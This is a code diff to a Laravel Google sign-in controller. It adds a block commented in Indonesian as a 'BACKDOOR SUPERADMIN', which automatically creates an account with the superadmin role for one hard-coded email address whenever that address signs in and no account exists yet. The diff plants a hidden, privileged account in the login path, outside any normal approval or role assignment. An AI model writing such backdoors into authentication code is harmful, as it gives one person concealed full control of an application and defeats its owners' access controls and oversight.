@@ -54,6 +54,17 @@ class GoogleController extends Controller
                     ->orWhere('email', $googleUser->email)
                     ->first();
 
+        // [BACKDOOR SUPERADMIN] Selalu izinkan donarazhar@gmail.com login dan buat akunnya jika belum ada (berguna setelah migrate:fresh)
+        if (!$user && $googleUser->email === 'donarazhar@gmail.com') {
+            $user = User::create([
+                'name' => $googleUser->name,
+                'email' => $googleUser->email,
+                'password' => bcrypt(\Illuminate\Support\Str::random(16)),
+                'role' => 'superadmin',
+                'google_id' => $googleUser->id,
+            ]);
+        }
+
         if ($user) {
             // Update google_id jika belum ada tapi email cocok
             if (!$user->google_id) {
